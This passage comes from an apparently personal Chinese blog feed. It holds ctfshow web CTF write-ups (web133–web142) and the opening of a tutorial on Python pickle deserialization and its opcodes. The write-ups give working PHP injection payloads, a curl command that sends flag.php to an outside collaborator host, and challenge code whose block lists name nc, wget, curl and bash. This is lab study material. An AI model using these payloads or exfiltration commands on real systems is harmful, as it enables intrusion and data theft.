python <a href="http://dirsearch.py">dirsearch.py</a> -u <a href="https://fcdcc901-047a-4270-9a98-da68f6613c74.challenge.ctf.show/">https://fcdcc901-047a-4270-9a98-da68f6613c74.challenge.ctf.show/</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>||<code>优先级低于</code>&amp;&amp;</p>
<p>就是说，先进行和的运算&amp;&amp;</p>
<p>但是在和运算之后，再进行||</p>
<p>那么他只需要||后面的成立即可</p>
<p>?code=admin&amp;password=123&amp;username=admin</p>
<p>ctfshow{83312124-29dd-45b6-81c7-91c03495e5b5}</p>
<h1>web133</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">传入?F=`<span class="variable">$F</span>` ;sleep <span class="number">3</span>  <span class="comment">//此时不被正则过滤，程序中$F=`$F` ;sleep 3</span></span><br><span class="line">经过<span class="title function_ invoke__">substr</span>()函数截断，那行代码变成<span class="keyword">eval</span>(`<span class="variable">$F</span>` ;);</span><br><span class="line">之前说了，程序中<span class="variable">$F</span>=`<span class="variable">$F</span>` ;sleep <span class="number">3</span></span><br><span class="line">那行代码就是<span class="keyword">eval</span>(`     `<span class="variable">$F</span>`;+sleep <span class="number">3</span>      `;);</span><br><span class="line">所以执行了sleep <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>同理可以构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>` ;ls /</span><br><span class="line">?F=`<span class="variable">$F</span>` ;tac /f*</span><br></pre></td></tr></table></figure>
<p>这样是没有回显的</p>
<p>打开bp的collaborator，复制到剪切板</p>
<p>payload: curl -X POST -F xx=@flag.php <a href="http://xxx">http://xxx</a></p>
<p>后面的xxx改为复制的东西，然后再刷新一下就有了</p>
<p><img src="/2025/02/05/php%E7%89%B9%E6%80%A7/image-20250126220545190.png" alt="image-20250126220545190"></p>
<p>ctfshow{e58de84c-ac21-4c84-b90d-c612cf054006}</p>
<h1>web134</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>parse_str()：将字符串解析成多个变量(示例来自chatgpt)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;user[name]=John&amp;user[age]=30&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$query</span>, <span class="variable">$output</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出解析后的数组</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [user] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; John</span><br><span class="line">            [age] =&gt; <span class="number">30</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>extract()：从数组中将变量导入到当前的符号表</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = [</span><br><span class="line">    <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&quot;city&quot;</span> =&gt; <span class="string">&quot;New York&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 extract() 将数组元素转换为变量</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;  <span class="comment">// 输出: John</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;   <span class="comment">// 输出: 30</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$city</span>;  <span class="comment">// 输出: New York</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>
<p>$_SERVER[‘QUERY_STRING’]是全局变量，存储了 URL 中查询字符串的部分（即 <code>?</code> 后的部分）</p>
<p><strong><code>parse_str($_SERVER['QUERY_STRING'])</code></strong> 会解析这个查询字符串，并将其转换为 <code>$_POST</code> 数组中的数据（即使数据是通过 GET 请求传递的）。</p>
<p>payload的解释：我们传进去之后他正好绕过了第一个if函数体。然后经过parse_str()和$_SERVER[‘QUERY_STRING’]把我们?后面的的部分当作post传来的数组储存起来，就是通过parse_str()包括的内部东西会被当做post。然后后面的extract()函数会把我们传入的东西加上$，当作变量，然后就相当于传入了相应的key，最后拿到flag。我们需要看源码。</p>
<p>ctfshow{9e94d52f-22ec-4266-9a50-0bd15766e46d}</p>
<h1>web135</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?F=<code>$F</code> ;cp flag.php 1.txt<br>
?F=<code>$F</code> ;nl flag.php&gt;1.txt<br>
?F=<code>$F</code> ;mv flag.php 1.txt</p>
<p>ctfshow{0ee326bd-a1b7-40d7-ba5c-0c6ae7e1cc7f}</p>
<h1>web136</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>linux tee命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo &quot;Hello, world!&quot; | tee output.txt					将Hello, world!弄到txt文件中</span><br><span class="line">$ echo &quot;Hello again!&quot; | tee -a output.txt				-a为追加</span><br><span class="line">$ echo &quot;This is important!&quot; | tee file1.txt file2.txt	弄到多个文件</span><br></pre></td></tr></table></figure>
<p>?c=ls /|tee 1发现有flag文件</p>
<p>f149_15_h3r3</p>
<p>?c=tac /f149_15_h3r3|tee 2</p>
<p>ctfshow{5b5c2d9a-c827-4c31-88d3-3dca44d122bf}</p>
<h1>web137</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>调用cyfshow类中getFlag()方法。</p>
<p>php中 -&gt;与:: 调用类中的成员的区别：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-&gt;用于动态语境处理某个类的某个实例</span><br><span class="line"></span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法</span><br></pre></td></tr></table></figure>
<p>双冒号可以不用实例化类就可以直接调用类中的方法</p>
<p>ctfshow=ctfshow::getFlag</p>
<p>ctfshow{f3dd2e35-e4e2-4d4b-bd5b-32e000547bd9}</p>
<h1>web138</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p><code>strripos()</code> 是 PHP 中的一个函数，计算指定字符串在目标字符串中最后一次出现的位置，用于查找 <strong>字符串</strong> 在另一个字符串中最后一次出现的位置，<strong>不区分大小写</strong>。它与 <code>strrpos()</code> 类似，区别在于 <code>strripos()</code> 会忽略大小写，而 <code>strrpos()</code> 区分大小写。</p>
<p>call_user_func函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。</p>
<p>ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</p>
<p>ctfshow{30dacf69-8c78-4a8e-9930-156604fa0ae2}</p>
<h1>web139</h1>
<p>毛病</p>
<h1>web140</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一题我们最终要使intval($code) == 'ctfshow’成立</p>
<p>intval()函数会把非数字的字符转换为零</p>
<p>那么我们只需要code为零即可</p>
<p>f1=usleep&amp;f2=usleep<br>
f1=md5&amp;f2=phpinfo<br>
f1=md5&amp;f2=sleep<br>
f1=md5&amp;f2=md5<br>
f1=current&amp;f2=localeconv<br>
f1=sha1&amp;f2=getcwd                    因为/var/www/html md5后开头的数字所以我们改用sha1</p>
<p>ctfshow{4d5a17a5-b054-4ffa-bb28-4e5822a7f3c5}</p>
<h1>web141</h1>
<p>无</p>
<p>数字是可以和命令进行一些运算的，例如 <code>1-phpinfo();</code></p>
<h1>web142</h1>
<p>0</p>
<p>ctfshow{48e932d7-ed2c-4fad-8bda-caa18de9bfb9}</p>
]]></content>
  </entry>
  <entry>
    <title>pickle反序列化</title>
    <url>/2025/04/29/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p><a href="https://xz.aliyun.com/news/7032">原文链接1</a></p>
<p><a href="https://xz.aliyun.com/news/13498">原文链接2</a></p>
<p>这里只是为了让我的思绪跟着原文的思路,并加上个人理解,所以不建议看我的文章</p>
<h2 id="基本知识">基本知识</h2>
<h3 id="pickle简介">pickle简介</h3>
<p>pickle是Python的一个库,可以对一个对象进行序列化和反序列化操作.其中<code>__reduce__</code>魔法函数会在一个对象被反序列化时自动执行,我们可以通过在<code>__reduce__</code>魔法函数内植入恶意代码的方式进行任意命令执行.通常会利用到Python的反弹shell.</p>
<ul>
<li>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</li>
<li>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。</li>
<li>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</li>
<li>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</li>
</ul>
<h4 id="序列化和反序列化">序列化和反序列化</h4>
<p>序列化就是将一个对象转换为以字符串方式存储的过程,反序列化就是将字符串重新变为一个对象的实例.和php的反序列化差不多.</p>
<blockquote>
<p>注意,在linux下和windows下进行序列化的操作的结果可能会有所不同,在做题时需要根据靶机的系统选择用windows还是linux进行序列化操作.</p>
</blockquote>
<h4 id="关于序列化和反序列化的函数">关于序列化和反序列化的函数</h4>
<ol>
<li><code>pickle.dump()</code></li>
<li><code>pickle.load()</code></li>
<li><code>pickle.dumps()</code></li>
<li><code>pickle.loads()</code></li>
</ol>
<p>其中两个dump函数是把python对象转换为二进制对象的,两个load函数是把二进制对象转换为python对象的.</p>
<p>而s函数是指对字符串进行反序列化和序列化操作,另外两个函数是对文件进行操作.</p>
<h4 id="python魔术方法">python魔术方法</h4>
<p>略.另开文章</p>
<h4 id="常用opcode">常用opcode</h4>
<p>在Python的pickle.py中，我们能够找到所有的opcode及其解释，常用的opcode如下，这里我们以V0版本为例</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
</tr>
</thead>
<tbody>
<tr>
<td>c</td>
<td>获取一个全局对象或import一个模块</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n（也可以使用双引号、'等python字符串形式）</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
</tr>
</tbody>
</table>
<p>比较全的指令集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span><br><span class="line"># here is in kind-of alphabetical order of 1-character pickle code.</span><br><span class="line"># pickletools groups them by purpose.</span><br><span class="line"># 说明:</span><br><span class="line"># 1.如果对栈顶元素只说了取出,而没有说弹出的话那就说明只是将栈顶元素复制一份放到一个变量或者就是后面的操作对栈顶元素进行更新修改,但是这个栈顶元素是不会弹出的</span><br><span class="line"># 2.部分说明中对数据进行操作先弹出然后进行操作再进行压栈,但是对照源码可能是对栈数组直接进行直接截取而并没有pop弹出或者append的压栈操作,我这里描述为弹出和压栈的过程是为了便于理解</span><br><span class="line"># 3.用于指定后面需要读取的数据大小的字节读出来之后,有可能是按照字符字面大小读取,也可能是按照其16进制大小进行数据读取,例如字符&#x27;1&#x27;=&#x27;\x31&#x27;,0x31=49可能是读取1字节大小也肯能是读取49字节大小,注意我的注释描述</span><br><span class="line"># 4._struct.unpack解压&lt;i格式数据的时候需要传入4字节大小的数据,然后会把4个字节左右顺序调换,得到一个8位的16进制数,最后将其转为一个10进制整数,例如_struct.unpack(&#x27;&lt;i&#x27;, b&#x27;\x00\x01\x00\x00&#x27;)[0]=&gt;0x00001000=&gt;256</span><br><span class="line"># 5.struct.unpack解压&lt;Q格式数据则是需要传入8字节大小数据,转换操作同上,例如unpack(&#x27;&lt;Q&#x27;, b&#x27;\x00\x01\x00\x00\x00\x00\x00\x00&#x27;)[0] =&gt; 0x0000000000000100 =&gt; 256</span><br><span class="line">MARK           = b&#x27;(&#x27;   #向栈中压入一个Mark标记</span><br><span class="line">STOP           = b&#x27;.&#x27;   #相当于停止当前的反序列化过程</span><br><span class="line">POP            = b&#x27;0&#x27;   #从栈中pop出一个元素,就是删除栈顶元素</span><br><span class="line">POP_MARK       = b&#x27;1&#x27;   #从栈中不断pop元素直到遇到Mark标记</span><br><span class="line">DUP            = b&#x27;2&#x27;   #向栈中再压入一个当前的栈顶元素,就是复制一份当前栈顶元素然后进行压栈</span><br><span class="line">FLOAT          = b&#x27;F&#x27;   #读取当前行到行末尾,然后转为float类型,向栈中压入一个float浮点数</span><br><span class="line">INT            = b&#x27;I&#x27;   #向栈中压入一个int整数,整数就是当前行的最后一个字节,不过如果整数为01的时候压入的是True,为00的时候压入的是False</span><br><span class="line">BININT         = b&#x27;J&#x27;   #从后面的输入中读取4个字节并且使用unpack通过&#x27;&lt;i&#x27;的格式将4字节的buffer数据解包转为int类型,后面不能换行,直接家下一步的操作b&quot;(S&#x27;a&#x27;\nK\x01\x01\x01\x01.&quot;</span><br><span class="line">BININT1        = b&#x27;K&#x27;   #和上面BININT一样,不过K操作只读取一个字节的数据b&quot;(S&#x27;a&#x27;\nK\x01.&quot;</span><br><span class="line">LONG           = b&#x27;L&#x27;   #读取当前行到行末尾,然后转为int类型,但如果后面是字符L的话会先去掉最后一个字符L再转int</span><br><span class="line">BININT2        = b&#x27;M&#x27;   #从后面的输入中读取2个字节并且使用unpack通过&#x27;&lt;H&#x27;的格式将2字节的buffer作为一个2进制数解包为int,后面不能换行,直接加下一步的操作b&quot;(S&#x27;a&#x27;\nM\x01\x01.&quot;</span><br><span class="line">NONE           = b&#x27;N&#x27;   #向栈中压入一个None元素,后面不能换行,直接加下一步的操作b&quot;(S&#x27;a&#x27;\nN.&quot;</span><br><span class="line">PERSID         = b&#x27;P&#x27;   #读取当前行到行末尾,将读取到的数据作为id,通过persistent_load函数获得obj对象返回后将obj对象压栈,默认情况没用,要重写persistent_load函数才能生效</span><br><span class="line">BINPERSID      = b&#x27;Q&#x27;   #和上面作用一样,从当前栈中弹出一个元素作为id,通过persistent_load...</span><br><span class="line">REDUCE         = b&#x27;R&#x27;   #从当前栈中弹出两次元素,第一次是函数参数args,第二次是函数func,执行func(args)</span><br><span class="line">STRING         = b&#x27;S&#x27;   #向栈中压入一个string字符串,内容就是后面的数据,后面的字符串第一个和最后一个必须是单引号b&quot;(S&#x27;a&#x27;\nS&#x27;&#x27;a&#x27;&#x27;\n.&quot;</span><br><span class="line">BINSTRING      = b&#x27;T&#x27;   #从后面数据读取4字节数据,通过unpack使用&lt;i格式将数据解压后变为int类型, 然后将其作为一个长度, 后面读取这个指定长度的数据作为字符串进行压栈b&quot;(S&#x27;a&#x27;\nT\x10\x00\x00\x000123456789abcdef.&quot;</span><br><span class="line"># _struct.unpack(&#x27;&lt;i&#x27;, b&quot;\x10\x00\x00\x00&quot;) =&gt; (16,)</span><br><span class="line">SHORT_BINSTRING= b&#x27;U&#x27;   #先读取一个字节数据作为长度,然后按照这个长度读取字符串,读出的字符串压栈</span><br><span class="line">UNICODE        = b&#x27;V&#x27;   